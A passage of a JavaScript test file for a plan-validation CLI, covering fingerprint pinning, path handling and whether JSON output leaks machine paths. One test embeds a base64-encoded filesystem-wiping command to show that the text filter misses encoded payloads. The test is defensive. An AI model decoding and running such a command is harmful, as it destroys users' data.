  const pinned = JSON.parse(readFileSync(EXAMPLE, 'utf8')).application.inspectionFingerprint;
  assert.equal(result.inspectionFingerprint, pinned, 'and the value it pins is the value this project derives');
  assert.match(pinned, /^[0-9a-f]{64}$/);
  assert.ok(t);
});

test('the CLI reads awkward paths, and leaks no machine layout', async (t) => {
  const { mkdtempSync, writeFileSync, symlinkSync, mkdirSync } = await import('node:fs');
  const { tmpdir } = await import('node:os');
  const base = mkdtempSync(join(tmpdir(), 'ax2-cli-'));
  const spaced = join(base, 'a directory with spaces');
  mkdirSync(spaced);
  const planPath = join(spaced, 'my plan.json');
  const source = readFileSync(EXAMPLE, 'utf8');
  writeFileSync(planPath, source);

  const spacedResult = await solutionCommand({ planPath, mode: 'validate', json: true });
  assert.equal(spacedResult.exitCode, 0, 'a path with spaces is a path');

  const linkPath = join(base, 'link.json');
  symlinkSync(planPath, linkPath);
  assert.equal((await solutionCommand({ planPath: linkPath, mode: 'validate' })).exitCode, 0, 'a symlink resolves');

  // A project outside the working directory, addressed by --root.
  const outside = await solutionCommand({ planPath: EXAMPLE, mode: 'check', json: true, rootDir: ROOT });
  assert.equal(outside.exitCode, 0);

  // Nothing in the machine-readable output names this machine. A report a
  // reviewer commits must not carry the layout of the laptop that made it.
  // Collected through the command's own sink. Patching `process.stdout` is not
  // a testing technique: on a pipe the writer that owns it may be awaiting the
  // write callback a stub forgets to call, and the process simply stops — which
  // is exactly what happened in CI when this test first patched the global.
  const captured = [];
  await solutionCommand({
    planPath, mode: 'check', json: true, rootDir: ROOT,
    out: (text) => captured.push(text),
  });
  const out = captured.join('');
  assert.ok(out.length > 0);
  assert.equal(out.includes(base), false, 'no temporary directory in the output');
  assert.equal(out.includes(ROOT), false, 'no repository root in the output');
  assert.equal(/"[^"]*\/(home|Users|tmp|var)\//.test(out), false, 'no absolute path anywhere in the JSON');
  assert.equal(JSON.parse(out).inspectionFingerprint.length, 64, 'and it is parseable JSON on stdout alone');
  assert.ok(t);
});

test('text filtering is defense in depth, and says so rather than claiming a sandbox', async (t) => {
  // Honest about the false negatives. An encoded payload passes the text
  // filter, and that changes nothing: the contract has no field anything reads
  // as an instruction, which is the actual boundary.
  const encoded = 'cm0gLXJmIC8=';
  const { problems } = validateSolutionPlan(minimalPlan({
    steps: [{ id: 's1', decisionId: 'd1', description: `Apply the value ${encoded} to the config`, requiresCapabilities: [], approvals: [], verifies: [] }],
  }));
  assert.deepEqual(problems, [], 'an encoded payload is not detected — and is inert, because nothing executes a field');

  const vocabulary = solutionPlanVocabulary();
  assert.match(vocabulary.executableContent.rule, /non-executable \*\*by contract\*\*/);
  assert.match(vocabulary.executableContent.textFiltering, /defense in depth, not a security sandbox/);
  assert.match(vocabulary.executableContent.textFiltering, /will also miss a sufficiently encoded payload/);
  assert.ok(vocabulary.executableContent.shapes.length >= 5);
  assert.ok(t);
});
